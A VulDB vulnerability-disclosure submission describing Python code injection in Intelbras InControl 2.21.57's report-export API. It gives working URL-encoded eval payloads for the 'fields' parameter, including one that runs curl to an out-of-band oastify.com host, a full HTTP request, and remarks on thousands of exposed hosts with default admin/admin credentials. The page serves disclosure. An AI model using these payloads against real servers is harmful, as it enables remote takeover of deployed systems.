<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Submit #375614: Intelbras InControl 2.21.57 (last version) Command Injection</title><meta name="keywords" content="#375614: Intelbras InControl 2.21.57 (last version) Command Injection,VulDB,Vulnerability,Vulnerability Database,Vulnerability Data Feed,VDB,VulnDB,CVE,NVD,Cyber Threat Intelligence,Hack,Hacking,IT-Security,Information Security,Infosec,Cybersecurity,Exploit,Exploiting,Open-Source" /><meta name="description" content="Intelbras InControl 2.21.57 (last version) Command Injection" /><meta name="robots" content="all" /><meta name="revisit-after" content="90 days" /><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,viewport-fit=cover" /><link rel="preload" href="/_thm/style-20240920.min.css" as="style"><link rel="preload" href="/_thm/fontawesome-6.1.1/css/all.min.css" as="style"><link rel="stylesheet" href="/_thm/style-20240920.min.css" type="text/css" media="all" /><link rel="stylesheet" href="/_thm/fontawesome-6.1.1/css/all.min.css" type="text/css" media="all" /><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#555"><meta name="msapplication-TileColor" content="#555"><link rel="alternate" hreflang="de" href="https://vuldb.com/de/?submit.375614" /><link rel="alternate" hreflang="fr" href="https://vuldb.com/fr/?submit.375614" /><link rel="alternate" hreflang="it" href="https://vuldb.com/it/?submit.375614" /><link rel="alternate" hreflang="es" href="https://vuldb.com/es/?submit.375614" /><link rel="alternate" hreflang="pt" href="https://vuldb.com/pt/?submit.375614" /><link rel="alternate" hreflang="ru" href="https://vuldb.com/ru/?submit.375614" /><link rel="alternate" hreflang="pl" href="https://vuldb.com/pl/?submit.375614" /><link rel="alternate" hreflang="sv" href="https://vuldb.com/sv/?submit.375614" /><link rel="alternate" hreflang="zh" href="https://vuldb.com/zh/?submit.375614" /><link rel="alternate" hreflang="ja" href="https://vuldb.com/ja/?submit.375614" /><link rel="alternate" hreflang="ar" href="https://vuldb.com/ar/?submit.375614" /><link rel="alternate" type="application/rss+xml" title="Recent" href="/?rss.recent" /><link rel="alternate" type="application/rss+xml" title="Updates" href="/?rss.updates" /><link rel="alternate" type="application/rss+xml" title="Submits" href="/?rss.submits" /><link rel="alternate" type="application/rss+xml" title="Changelog" href="/?rss.changelog" /></head><body><div id="app"><header id="app-header"><nav id="app-nav"><div id="menuwrapper"><div id="menu"><div id="logo" class="hideonphone hideonphone_h" title="VulDB"><a href="?"><img src="/_thm/vuldb.png" alt="VulDB"></a></div><div id="menubox"><form id="search_nav" class="hideonphone_h hideonphonesmall" method="post" action="?search"><input type="text" name="search" maxlength="255" placeholder="Vendor, Product, CVE, ..." autocomplete="on" ><input type="hidden" name="csrftoken" value="ZLb ZM|X9m7v[Ud!WD_cM[=1k=@ p?=tx8v"><input type="submit" class="hideonphone buttoninsidetextbox" value="&#128269;"></form><div id="mainmenu"><ul class="top-level-menu"><li><div><a href="?"><div class="m_txt">Home</div></a></div><ul class="second-level-menu"><li><a href="?"><div class="m_txt">Overview</div></a></li><li><a href="?live.recent"><div class="m_txt">Live Recent</div></a></li><li><a href="?live.updates"><div class="m_txt">Live Updates</div></a></li><li><a href="?live.archive"><div class="m_txt">Live Archive</div></a></li><li><a href="?live.submits"><div class="m_txt">Live Submits</div></a></li></ul></li><li><div class="m_a"><a href="?recent"><div class="m_txt">Entries</div></a></div><ul class="second-level-menu"><li><a href="?recent"><div class="m_txt">Recent</div></a></li><li><a href="?updates"><div class="m_txt">Updates</div></a></li><li class="hideonphonesmall"><a href="?commits"><div class="m_txt">Commits</div></a></li><li><a href="?archive"><div class="m_txt">Archive</div></a></li><li><a href="?cna"><div class="m_txt">CNA</div></a></li><li><a href="?stats"><div class="m_txt">Stats</div></a></li><li class="hideonphone"><a href="?submits"><div class="m_txt">Submits</div></a></li><li class="hideonphone"><a href="?id.add"><div class="m_txt">Add</div></a></li></ul></li><li class="hideontablet"><div><a href="?product"><div class="m_txt">Products</div></a></div><ul class="second-level-menu"><li><a href="?vendor"><div class="m_txt">Vendor</div></a></li><li><a href="?product"><div class="m_txt">Product</div></a></li><li><a href="?type"><div class="m_txt">Type</div></a></li></ul></li><li class="hideonphone"><div><a href="?cvssv3"><div class="m_txt">Risk</div></a></div><ul class="second-level-menu"><li><a href="?cvssv4"><div class="m_txt">CVSSv4</div></a></li><li><a href="?cvssv3"><div class="m_txt">CVSSv3</div></a></li><li><a href="?cvssv2"><div class="m_txt">CVSSv2</div></a></li><li><a href="?risk"><div class="m_txt">Risks</div></a></li><li><a href="?exploits"><div class="m_txt">Exploits</div></a></li></ul></li><li class="hideonphone"><div><a href="?cti"><div class="m_txt">Threat</div></a></div><ul class="second-level-menu"><li class="hideonphonesmall"><a href="?cti.analyze"><div class="m_txt">Analysis</div></a></li><li><a href="?activities"><div class="m_txt">Activities</div></a></li><li><a href="?events"><div class="m_txt">Events</div></a></li><li><a href="?actor"><div class="m_txt">Actors</div></a></li><li><a href="?ip"><div class="m_txt">IP addresses</div></a></li><li><a href="?country"><div class="m_txt">Country</div></a></li><li><a href="?sector"><div class="m_txt">Sector</div></a></li><li><a href="?exploitprices"><div class="m_txt">Exploit Prices</div></a></li></ul></li><li class="hideontablet"><div><a href="?references"><div class="m_txt">References</div></a></div><ul class="second-level-menu"><li><a href="?references"><div class="m_txt">References</div></a></li><li><a href="?tools"><div class="m_txt">Tools</div></a></li><li><a href="?videos"><div class="m_txt">Videos</div></a></li><li><a href="?googlehacking"><div class="m_txt">Google Hacking</div></a></li><li><a href="?export"><div class="m_txt">Exports</div></a></li></ul></li><li class="hideonphonesmall"><div><a href="?search"><div class="m_txt">Search</div></a></div><ul class="second-level-menu"><li><form id="search_menu" method="post" action="?search"><div><input type="text" name="search" maxlength="255" placeholder="Type here..." autocomplete="off" ><input type="hidden" name="csrftoken" value="ZLb ZM|X9m7v[Ud!WD_cM[=1k=@ p?=tx8v"></div></form></li><li><a href="?search"><div class="m_txt">Search</div></a></li><li class="hideonphonesmall"><a href="?search.advanced"><div class="m_txt">Advanced Search</div></a></li><li><a href="?user"><div class="m_txt">User</div></a></li><li class="hideonphone"><a href="?feeds"><div class="m_txt">Feeds</div></a></li><li><a href="?kb.api"><div class="m_txt">API</div></a></li></ul></li><li class="hideonphablet"><div><a href="?kb"><div class="m_txt">Support</div></a></div><ul class="second-level-menu"><li><a href="?kb"><div class="m_txt">Knowledge Base</div></a></li><li><a href="?kb.faq"><div class="m_txt">FAQ</div></a></li><li><a href="?kb.changelog"><div class="m_txt">Changelog</div></a></li><li><a href="?kb.roadmap"><div class="m_txt">Roadmap</div></a></li><li><a href="?status"><div class="m_txt">Status</div></a></li><li><a href="?contact"><div class="m_txt">Contact</div></a></li></ul></li><li class="hideonwatch"><div><a href="?login"><div class="m_txt">Login</div></a></div><ul class="second-level-menu"><li><a href="?login"><div class="m_txt">Login</div></a></li><li><a href="?signup"><div class="m_txt">Signup</div></a></li><li><a href="?pay"><div class="m_txt">Purchase</div></a></li><li><a href="?kb.terms"><div class="m_txt">Terms of Use</div></a></li></ul></li></ul></div></div></div></div></nav></header><main id="app-main"><aside id="app-sidemenu" class="app-sidelement hideonphone"><ul><li><a href="?live.submits"><div class="icon fas fa-satellite-dish"></div><div class="icontext">Live</div></a></li><li><a href="?submits"><div class="icon fa-regular fa-folder-open"></div><div class="icontext">Submits</div></a></li><li><a href="?id.add"><div class="icon fas fa-file-upload"></div><div class="icontext">Add</div></a></li><li><a href="?kb.submission"><div class="icon fas fa-file-upload"></div><div class="icontext">Policy</div></a></li><li><a href="?pay"><div class="icon fa-solid fa-cart-shopping"></div><div class="icontext">Purchase</div></a></li></ul><div id="usermenu" class="hideonphonesmall_h"><a href="?login">Login</a><a href="?signup">Signup</a></div></aside><div id="container"><div id="content"><nav id="breadcrumbs" class="hideonphonesmall hideonphone_h"><a href="?" class="breadcrumbs-item">&#x1f6e1; Home</a><a href="?submit" class="breadcrumbs-item">Submit</a><div class="breadcrumbs-item breadcrumbs-item-isactive">375614</div></nav><a href="?rss.submit" class="rssicon fas fa-rss hideonphone hideonphone_h" alt="RSS" title="RSS" target="rss"></a><h1>Submit #375614: Intelbras InControl 2.21.57 (last version) Command Injection<span class="minibutton"><a href="?kb.submission">info</a></span></h1><div class="tablewrapper"><table class="htable col1fitcontent"><tr><th>Title</th><td class="bold">Intelbras InControl 2.21.57 (last version) Command Injection</td></tr><tr><th>Description</th><td>Hello, I found a python code injection vulnerability in the latest version of the InControl Product, the vulnerability occurs through an api call for report export, through the vulnerability it is possible to take full control of the server.On fofa.info, there are over 2500 vulnerable hosts with many of them having the default admin/admin credential.

PoC:
Language Software: PT-BR
1 - After downloading the application and uploading it locally, log in with admin/admin and access the &quot;Reports&quot; or &quot;Relat&oacute;rios&quot; section and &quot;Relat&oacute;rio de Operadores&quot;.
2 - Check a box and click &quot;Export report&quot; and select &quot;PDF&quot;.
3 - In burp, you can see that there is an api call like this:
(Investigating further I discovered that there are two paths /v1/operador/... and /v1/evento_operador/...)
GET /v1/evento_operador/relatorio?page=1&amp;limit=10000&amp;fields=%5B%22operador%22,%22acao%22,%22data_evento%22,%22objeto_afetado%22,%22tipo_objeto%22%5D
or
GET /v1/operador/relatorio?page=1&amp;limit=10000&amp;fields=%5B%22operador%22,%22acao%22,%22data_evento%22,%22objeto_afetado%22,%22tipo_objeto%22%5D

4 - Python code injection occurs in the &quot;fields=&quot; parameter.
5 - Take the request to the repeater and insert the following payload containing python code:
/v1/evento_operador/relatorio?page=1&amp;limit=10000&amp;fields=eval(compile(&#039;for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)&#039;%2c&#039;a&#039;%2c&#039;single&#039;))

6 - Note that the response took 20 seconds to come.
7 - Through this, we can execute commands. Watch the video below for better understanding (Please do not share the video!)

https://youtu.be/UdZVktPUy8A

Requests (EXECUTE CURL TO COLLABORATOR):
GET /v1/operador/relatorio?page=1&amp;limit=10000&amp;fields=eval%28compile%28%22%22%22for%20x%20in%20range%281%29%3A%5Cn%20import%20os%5Cn%20os.popen%28r%27curl%20http://0tucwq2m62h4pzo0gs2iif1lico3cw0l.oastify.com%27%29.read%28%29%22%22%22%2C%27%27%2C%27single%27%29%29 HTTP/1.1
Host: localhost:4441
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.
Origin: https://localhost:4445
Referer: https://localhost:4445/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Te: trailers
Connection: keep-alive


Payloads: 
Time Delay:    eval(compile(&#039;for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)&#039;%2c&#039;a&#039;%2c&#039;single&#039;))
Curl:      eval%28compile%28%22%22%22for%20x%20in%20range%281%29%3A%5Cn%20import%20os%5Cn%20os.popen%28r%27curl%20http://0tucwq2m62h4pzo0gs2iif1lico3cw0l.oastify.com%27%29.read%28%29%22%22%22%2C%27%27%2C%27single%27%29%29</td></tr><tr><th>Source</th><td><span title="visit with caution">&#9888;&#65039; https:/<wbr>/<wbr>www.<wbr>intelbras.<wbr>com/<wbr>pt-br/<wbr>software-de-gerenciamento-de-controle-de-acesso-incontrol-web</span></td></tr><tr><th>User</th><td><a href="?user.40142"><div class="user-avatar fa-solid fa-cow fuchsia bg-purple"></div>&nbsp;Stux (UID 40142)</a></td></tr><tr><th>Submission</th><td>07/16/2024 03:55 PM (6 months ago)</td></tr><tr><th>Moderation</th><td>09/28/2024 03:31 PM (2 months later)</td></tr><tr><th>Status</th><td><a href="?kb.submission" class="symbol cvss1">Accepted</a></td></tr><tr><th>VulDB Entry</th><td><a href="?id.278828" class="symbol price4">278828</a> [Intelbras InControl up to 2.21.57 Relatório de Operadores Page /v1/operador/ fields code injection]</td></tr><tr><th>Points</th><td>20</td></tr></table></div><p><div class="submenubuttons"><a href="?submit.375613">&#9666;<span class="hideonphone"> Previous</span></a><a href="?submit">Overview</a><a href="?submit.375615"><span class="hideonphone">Next </span>&#9656;</a></div></p><section id="servicebox" class="ribbon ribbonbox hideonwatch hideonphablet_h"><h1>Do you want to use VulDB in your project?</h1><p>Use the official API to access entries easily!</p><a href="?kb.api"><input type="button" value="Click here" /></a></section></div></div><aside id="app-tocmenu" class="app-sidelement hideonphablet"><div class="sidemenuwrapper"><h2><span class="fa-solid fa-triangle-exclamation"></span> Notice</h2><p>Submissions are made by <a href="?user">VulDB community users</a>. VulDB is <em>not responsible</em> for their content nor the links to external sources.</p><p>Please use the raw information shown and the links listed <em>with caution</em>. They might contain malicious and harmful actions, code or data.</p><p>The corresponding VulDB entries contain the moderated, verified, and normalized information provided within the raw submission.</p><h2><span class="fas fa-question-circle"></span> Documentation</h2><ul><li><a href="?kb.submission">Submission Policy</a></li><li><a href="?kb.processing">Data Processing</a></li><li><a href="?kb.cna">CVE Handling</a></li></ul></div></aside></main><footer id="app-footer"><div id="footerwrapper"><div id="footercontent"><div id="copyright"><a href="?kb.terms">&copy; <span class="hideonphone">1997-</span>2025<span class="hideonphonesmall"> vuldb.com</span></a><span class="hideontablet"> &middot; <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="license">cc by-nc-sa</a></span></div><div id="languages" class="hideonphablet"><a href="/de/?submit.375614" hreflang="de" title="German">de</a> &middot; <a href="/fr/?submit.375614" hreflang="fr" title="French">fr</a> &middot; <a href="/it/?submit.375614" hreflang="it" title="Italian">it</a> &middot; <a href="/es/?submit.375614" hreflang="es" title="Spanish">es</a> &middot; <a href="/pt/?submit.375614" hreflang="pt" title="Portuguese">pt</a> &middot; <a href="/ru/?submit.375614" hreflang="ru" title="Russian">ru</a> &middot; <a href="/pl/?submit.375614" hreflang="pl" title="Polish">pl</a> &middot; <a href="/sv/?submit.375614" hreflang="sv" title="Swedish">sv</a> &middot; <a href="/zh/?submit.375614" hreflang="zh" title="Chinese">zh</a> &middot; <a href="/ja/?submit.375614" hreflang="ja" title="Japanese">ja</a> &middot; <a href="/ar/?submit.375614" hreflang="ar" title="Arabic">ar</a></div><div id="version"><a href="?kb.changelog">v18.14.7</a></div></div></div></footer></div></body></html>